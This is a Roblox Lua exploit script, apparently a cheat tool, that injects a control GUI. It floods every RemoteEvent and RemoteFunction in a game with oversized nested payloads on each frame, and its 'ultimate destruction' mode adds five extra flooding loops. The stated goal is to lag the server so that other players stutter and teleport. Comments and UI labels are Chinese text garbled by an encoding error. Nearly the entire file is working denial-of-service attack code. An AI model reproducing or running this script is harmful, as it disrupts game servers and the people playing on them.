-- æ–‡ä»¶åï¼šServerLagAttack_Ultimate.lua
-- ç»ˆææœåŠ¡å™¨å¡é¡¿æ”»å‡»å·¥å…· - ä¸“é—¨é€ æˆæœåŠ¡å™¨ç«¯å¡é¡¿

local LagAttack = {}
LagAttack.IsRunning = false
LagAttack.AttackMode = "NORMAL"
LagAttack.RemoteObjects = {}
LagAttack.MaxAttackPower = 100
LagAttack.CurrentPower = 0
LagAttack.Stats = {
    totalCalls = 0,
    serverImpact = 0,
    playersAffected = 0
}

-- åˆ›å»ºæ”»å‡»ç•Œé¢
function LagAttack.createUI()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "ServerLagAttackGUI"
    screenGui.ResetOnSpawn = false
    
    local mainFrame = Instance.new("Frame")
    mainFrame.Size = UDim2.new(0, 400, 0, 350)
    mainFrame.Position = UDim2.new(0.5, -200, 0.5, -175)
    mainFrame.BackgroundColor3 = Color3.new(0.1, 0, 0)
    mainFrame.BorderSizePixel = 0
    mainFrame.Active = true
    mainFrame.Draggable = true
    
    -- æ ‡é¢˜æ 
    local titleBar = Instance.new("Frame")
    titleBar.Size = UDim2.new(1, 0, 0, 30)
    titleBar.BackgroundColor3 = Color3.new(0.8, 0, 0)
    titleBar.Parent = mainFrame
    
    local titleLabel = Instance.new("TextLabel")
    titleLabel.Size = UDim2.new(1, 0, 1, 0)
    titleLabel.BackgroundTransparency = 1
    titleLabel.Text = "æœåŠ¡å™¨å¡é¡¿æ”»å‡»å™¨"
    titleLabel.TextColor3 = Color3.new(1, 1, 1)
    titleLabel.TextSize = 14
    titleLabel.Font = Enum.Font.GothamBold
    titleLabel.Parent = titleBar
    
    -- æ”»å‡»æ¨¡å¼é€‰æ‹©
    local modeFrame = Instance.new("Frame")
    modeFrame.Size = UDim2.new(1, -10, 0, 100)
    modeFrame.Position = UDim2.new(0, 5, 0, 35)
    modeFrame.BackgroundTransparency = 1
    modeFrame.Parent = mainFrame
    
    local modeLabel = Instance.new("TextLabel")
    modeLabel.Size = UDim2.new(1, 0, 0, 20)
    modeLabel.Text = "æ”»å‡»å¼ºåº¦:"
    modeLabel.TextColor3 = Color3.new(1, 1, 1)
    modeLabel.BackgroundTransparency = 1
    modeLabel.Parent = modeFrame
    
    -- æ”»å‡»æŒ‰é’®
    local lightAttack = Instance.new("TextButton")
    lightAttack.Size = UDim2.new(0.3, -5, 0, 30)
    lightAttack.Position = UDim2.new(0, 0, 0, 25)
    lightAttack.BackgroundColor3 = Color3.new(0.2, 0.8, 0.2)
    lightAttack.Text = "è½»åº¦æ”»å‡»"
    lightAttack.TextColor3 = Color3.new(1, 1, 1)
    lightAttack.Parent = modeFrame
    
    local mediumAttack = Instance.new("TextButton")
    mediumAttack.Size = UDim2.new(0.3, -5, 0, 30)
    mediumAttack.Position = UDim2.new(0.35, 0, 0, 25)
    mediumAttack.BackgroundColor3 = Color3.new(0.8, 0.8, 0.2)
    mediumAttack.Text = "ä¸­åº¦æ”»å‡»"
    mediumAttack.TextColor3 = Color3.new(1, 1, 1)
    mediumAttack.Parent = modeFrame
    
    local heavyAttack = Instance.new("TextButton")
    heavyAttack.Size = UDim2.new(0.3, -5, 0, 30)
    heavyAttack.Position = UDim2.new(0.7, 0, 0, 25)
    heavyAttack.BackgroundColor3 = Color3.new(0.8, 0.2, 0.2)
    heavyAttack.Text = "é‡åº¦æ”»å‡»"
    heavyAttack.TextColor3 = Color3.new(1, 1, 1)
    heavyAttack.Parent = modeFrame
    
    -- ç»ˆææ”»å‡»
    local ultimateAttack = Instance.new("TextButton")
    ultimateAttack.Size = UDim2.new(1, 0, 0, 35)
    ultimateAttack.Position = UDim2.new(0, 0, 0, 60)
    ultimateAttack.BackgroundColor3 = Color3.new(0.5, 0, 0.5)
    ultimateAttack.Text = "ğŸ’€ ç»ˆææœåŠ¡å™¨æ¯ç­æ¨¡å¼"
    ultimateAttack.TextColor3 = Color3.new(1, 1, 1)
    ultimateAttack.TextSize = 12
    ultimateAttack.Parent = modeFrame
    
    -- çŠ¶æ€æ˜¾ç¤º
    local statusFrame = Instance.new("Frame")
    statusFrame.Size = UDim2.new(1, -10, 0, 150)
    statusFrame.Position = UDim2.new(0, 5, 0, 140)
    statusFrame.BackgroundColor3 = Color3.new(0.05, 0.05, 0.05)
    statusFrame.Parent = mainFrame
    
    local statusLabel = Instance.new("TextLabel")
    statusLabel.Size = UDim2.new(1, -10, 1, -10)
    statusLabel.Position = UDim2.new(0, 5, 0, 5)
    statusLabel.BackgroundTransparency = 1
    statusLabel.Text = "ç‚¹å‡»ä¸Šæ–¹æŒ‰é’®å¼€å§‹æ”»å‡»æœåŠ¡å™¨...\n\næ”»å‡»æ•ˆæœï¼šå…¶ä»–ç©å®¶ä¼šå¡é¡¿ã€ç¬ç§»"
    statusLabel.TextColor3 = Color3.new(1, 1, 1)
    statusLabel.TextSize = 11
    statusLabel.TextWrapped = true
    statusLabel.TextXAlignment = Enum.TextXAlignment.Left
    statusLabel.TextYAlignment = Enum.TextYAlignment.Top
    statusLabel.Parent = statusFrame
    
    -- æ§åˆ¶æŒ‰é’®
    local controlFrame = Instance.new("Frame")
    controlFrame.Size = UDim2.new(1, -10, 0, 40)
    controlFrame.Position = UDim2.new(0, 5, 1, -45)
    controlFrame.BackgroundTransparency = 1
    controlFrame.Parent = mainFrame
    
    local stopButton = Instance.new("TextButton")
    stopButton.Size = UDim2.new(0.5, -5, 1, 0)
    stopButton.Position = UDim2.new(0, 0, 0, 0)
    stopButton.BackgroundColor3 = Color3.new(0.3, 0.3, 0.3)
    stopButton.Text = "åœæ­¢æ”»å‡»"
    stopButton.TextColor3 = Color3.new(1, 1, 1)
    stopButton.Parent = controlFrame
    
    local hideButton = Instance.new("TextButton")
    hideButton.Size = UDim2.new(0.5, -5, 1, 0)
    hideButton.Position = UDim2.new(0.5, 5, 0, 0)
    hideButton.BackgroundColor3 = Color3.new(0.3, 0.3, 0.3)
    hideButton.Text = "éšè—ç•Œé¢"
    hideButton.TextColor3 = Color3.new(1, 1, 1)
    hideButton.Parent = controlFrame
    
    screenGui.Parent = game:GetService("CoreGui")
    mainFrame.Parent = screenGui
    
    -- ä¿å­˜å¼•ç”¨
    LagAttack.UI = {
        ScreenGui = screenGui,
        MainFrame = mainFrame,
        StatusLabel = statusLabel,
        LightAttack = lightAttack,
        MediumAttack = mediumAttack,
        HeavyAttack = heavyAttack,
        UltimateAttack = ultimateAttack,
        StopButton = stopButton,
        HideButton = hideButton
    }
    
    return mainFrame
end

-- è®¾ç½®æŒ‰é’®åŠŸèƒ½
function LagAttack.setupFunctions()
    -- æ”»å‡»æŒ‰é’®äº‹ä»¶
    LagAttack.UI.LightAttack.MouseButton1Click:Connect(function()
        LagAttack.startAttack("LIGHT")
    end)
    
    LagAttack.UI.MediumAttack.MouseButton1Click:Connect(function()
        LagAttack.startAttack("MEDIUM")
    end)
    
    LagAttack.UI.HeavyAttack.MouseButton1Click:Connect(function()
        LagAttack.startAttack("HEAVY")
    end)
    
    LagAttack.UI.UltimateAttack.MouseButton1Click:Connect(function()
        LagAttack.startAttack("ULTIMATE")
    end)
    
    LagAttack.UI.StopButton.MouseButton1Click:Connect(function()
        LagAttack.stopAttack()
    end)
    
    LagAttack.UI.HideButton.MouseButton1Click:Connect(function()
        LagAttack.UI.ScreenGui.Enabled = false
    end)
end

-- æ›´æ–°çŠ¶æ€
function LagAttack.updateStatus(text)
    if LagAttack.UI and LagAttack.UI.StatusLabel then
        LagAttack.UI.StatusLabel.Text = text
    end
end

-- æ”¶é›†æ‰€æœ‰è¿œç¨‹å¯¹è±¡
function LagAttack.collectRemotes()
    LagAttack.RemoteObjects = {}
    local services = {
        game:GetService("ReplicatedStorage"),
        game:GetService("ServerScriptService"),
        game:GetService("ServerStorage"),
        game:GetService("Workspace"),
        game:GetService("Players")
    }
    
    for _, service in ipairs(services) do
        for _, remote in ipairs(service:GetDescendants()) do
            if remote:IsA("RemoteEvent") or remote:IsA("RemoteFunction") then
                table.insert(LagAttack.RemoteObjects, remote)
            end
        end
    end
end

-- ç”Ÿæˆæ”»å‡»æ•°æ®
function LagAttack.generateAttackData(powerLevel)
    local dataSizes = {
        LIGHT = 10,      -- è½»åº¦ï¼š10ä¸ªå‚æ•°
        MEDIUM = 50,     -- ä¸­åº¦ï¼š50ä¸ªå‚æ•°  
        HEAVY = 200,     -- é‡åº¦ï¼š200ä¸ªå‚æ•°
        ULTIMATE = 1000  -- ç»ˆæï¼š1000ä¸ªå‚æ•°
    }
    
    local size = dataSizes[powerLevel] or 10
    local attackData = {}
    
    -- ç”Ÿæˆå¤§é‡æ•°æ®å ç”¨æœåŠ¡å™¨èµ„æº
    for i = 1, size do
        attackData[i] = {
            type = "attack",
            index = i,
            timestamp = tick(),
            randomData = string.rep("X", math.random(10, 100)),
            nestedTable = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10},
            deepNested = {
                level1 = {
                    level2 = {
                        level3 = {
                            data = "æ¶ˆè€—æœåŠ¡å™¨CPUèµ„æº"
                        }
                    }
                }
            }
        }
    end
    
    return attackData
end

-- æ‰§è¡ŒæœåŠ¡å™¨æ”»å‡»
function LagAttack.executeServerAttack(remote, powerLevel)
    local attackData = LagAttack.generateAttackData(powerLevel)
    
    local success = pcall(function()
        if remote:IsA("RemoteEvent") then
            -- å¤šæ¬¡è°ƒç”¨å¢åŠ æœåŠ¡å™¨å‹åŠ›
            for i = 1, LagAttack.getAttackMultiplier(powerLevel) do
                remote:FireServer(attackData)
                LagAttack.Stats.totalCalls = LagAttack.Stats.totalCalls + 1
            end
        elseif remote:IsA("RemoteFunction") then
            for i = 1, LagAttack.getAttackMultiplier(powerLevel) do
                remote:InvokeServer(attackData)
                LagAttack.Stats.totalCalls = LagAttack.Stats.totalCalls + 1
            end
        end
    end)
    
    return success
end

-- è·å–æ”»å‡»å€æ•°
function LagAttack.getAttackMultiplier(powerLevel)
    local multipliers = {
        LIGHT = 1,      -- è½»åº¦ï¼š1å€
        MEDIUM = 5,     -- ä¸­åº¦ï¼š5å€
        HEAVY = 20,     -- é‡åº¦ï¼š20å€
        ULTIMATE = 100  -- ç»ˆæï¼š100å€
    }
    return multipliers[powerLevel] or 1
end

-- å¼€å§‹æ”»å‡»
function LagAttack.startAttack(mode)
    if LagAttack.IsRunning then
        LagAttack.stopAttack()
        wait(0.1)
    end
    
    LagAttack.IsRunning = true
    LagAttack.AttackMode = mode
    LagAttack.collectRemotes()
    
    local modeNames = {
        LIGHT = "è½»åº¦æ”»å‡»",
        MEDIUM = "ä¸­åº¦æ”»å‡»", 
        HEAVY = "é‡åº¦æ”»å‡»",
        ULTIMATE = "ğŸ’€ ç»ˆææ¯ç­æ¨¡å¼"
    }
    
    LagAttack.updateStatus(modeNames[mode] .. "è¿›è¡Œä¸­...\næœåŠ¡å™¨å¡é¡¿æ•ˆæœï¼šå…¶ä»–ç©å®¶ä¼šç¬ç§»\næ”»å‡»æ¬¡æ•°: 0")
    
    -- æ ¹æ®æ¨¡å¼è®¾ç½®æ”»å‡»é¢‘ç‡
    local attackInterval = LagAttack.getAttackInterval(mode)
    
    LagAttack.AttackConnection = game:GetService("RunService").Heartbeat:Connect(function()
        if not LagAttack.IsRunning then return end
        
        -- å¯¹æ¯ä¸ªè¿œç¨‹å¯¹è±¡æ‰§è¡Œæ”»å‡»
        for _, remote in ipairs(LagAttack.RemoteObjects) do
            if remote and remote.Parent then
                LagAttack.executeServerAttack(remote, mode)
            end
        end
        
        -- æ›´æ–°çŠ¶æ€æ˜¾ç¤º
        LagAttack.updateAttackStatus()
    end)
    
    -- é¢å¤–æ”»å‡»çº¿ç¨‹ï¼ˆç»ˆææ¨¡å¼ï¼‰
    if mode == "ULTIMATE" then
        LagAttack.startUltimateAttack()
    end
end

-- è·å–æ”»å‡»é—´éš”
function LagAttack.getAttackInterval(mode)
    local intervals = {
        LIGHT = 0.3,    -- è½»åº¦ï¼š0.3ç§’
        MEDIUM = 0.1,   -- ä¸­åº¦ï¼š0.1ç§’
        HEAVY = 0.05,   -- é‡åº¦ï¼š0.05ç§’
        ULTIMATE = 0.01 -- ç»ˆæï¼š0.01ç§’
    }
    return intervals[mode] or 0.1
end

-- ç»ˆææ”»å‡»æ¨¡å¼
function LagAttack.startUltimateAttack()
    LagAttack.UltimateConnections = {}
    
    -- å¤šçº¿ç¨‹æ”»å‡»
    for i = 1, 5 do
        local conn = game:GetService("RunService").Heartbeat:Connect(function()
            if not LagAttack.IsRunning then return end
            
            for _, remote in ipairs(LagAttack.RemoteObjects) do
                if remote and remote.Parent then
                    -- å‘é€è¶…å¤§è´Ÿè½½æ•°æ®
                    local massiveData = {
                        type = "ultimate_attack",
                        size = 10000,
                        data = string.rep("ULTIMATE_LAG_", 1000),
                        nested = {
                            a = {b = {c = {d = {e = {f = {g = "LAG!"}}}}}}
                        }
                    }
                    
                    pcall(function()
                        if remote:IsA("RemoteEvent") then
                            remote:FireServer(massiveData)
                        else
                            remote:InvokeServer(massiveData)
                        end
                    end)
                end
            end
        end)
        
        table.insert(LagAttack.UltimateConnections, conn)
    end
end

-- æ›´æ–°æ”»å‡»çŠ¶æ€
function LagAttack.updateAttackStatus()
    local playerCount = #game.Players:GetPlayers()
    local impactLevel = math.min(100, LagAttack.Stats.totalCalls / 100)
    
    local statusText = string.format(
        "%sæ”»å‡»ä¸­...\næœåŠ¡å™¨å½±å“: %d%%\nç©å®¶å—å½±å“: %däºº\næ”»å‡»æ¬¡æ•°: %d",
        LagAttack.AttackMode,
        impactLevel,
        playerCount - 1, -- æ’é™¤è‡ªå·±
        LagAttack.Stats.totalCalls
    )
    
    LagAttack.updateStatus(statusText)
    
    -- ç•Œé¢ç‰¹æ•ˆ
    if LagAttack.UI and LagAttack.UI.MainFrame then
        local frame = LagAttack.UI.MainFrame
        local intensity = impactLevel / 100
        frame.BackgroundColor3 = Color3.new(0.1 + intensity * 0.5, 0, 0)
    end
end

-- åœæ­¢æ”»å‡»
function LagAttack.stopAttack()
    LagAttack.IsRunning = false
    
    if LagAttack.AttackConnection then
        LagAttack.AttackConnection:Disconnect()
        LagAttack.AttackConnection = nil
    end
    
    if LagAttack.UltimateConnections then
        for _, conn in ipairs(LagAttack.UltimateConnections) do
            conn:Disconnect()
        end
        LagAttack.UltimateConnections = {}
    end
    
    LagAttack.updateStatus("æ”»å‡»å·²åœæ­¢\næœ€ç»ˆç»Ÿè®¡:\næ”»å‡»æ¬¡æ•°: " .. LagAttack.Stats.totalCalls .. "\næœåŠ¡å™¨å·²æ¢å¤")
    
    if LagAttack.UI and LagAttack.UI.MainFrame then
        LagAttack.UI.MainFrame.BackgroundColor3 = Color3.new(0.1, 0, 0)
    end
end

-- å¿«æ·é”®æ”¯æŒ
game:GetService("UserInputService").InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end
    
    if input.KeyCode == Enum.KeyCode.F9 then
        LagAttack.UI.ScreenGui.Enabled = not LagAttack.UI.ScreenGui.Enabled
    elseif input.KeyCode == Enum.KeyCode.F8 then
        if not LagAttack.IsRunning then
            LagAttack.startAttack("HEAVY")
        else
            LagAttack.stopAttack()
        end
    end
end)

-- åˆå§‹åŒ–
function LagAttack.init()
    if not game:IsLoaded() then
        game.Loaded:Wait()
    end
    
    LagAttack.createUI()
    LagAttack.setupFunctions()
    
    LagAttack.updateStatus("æœåŠ¡å™¨å¡é¡¿æ”»å‡»å™¨å·²åŠ è½½\n\nå¿«æ·é”®:\nF9 - æ˜¾ç¤º/éšè—ç•Œé¢\nF8 - å¼€å§‹/åœæ­¢æ”»å‡»\n\né€‰æ‹©æ”»å‡»å¼ºåº¦å¼€å§‹!")
end

-- è‡ªåŠ¨å¯åŠ¨
spawn(function()
    wait(2)
    LagAttack.init()
end)

return LagAttack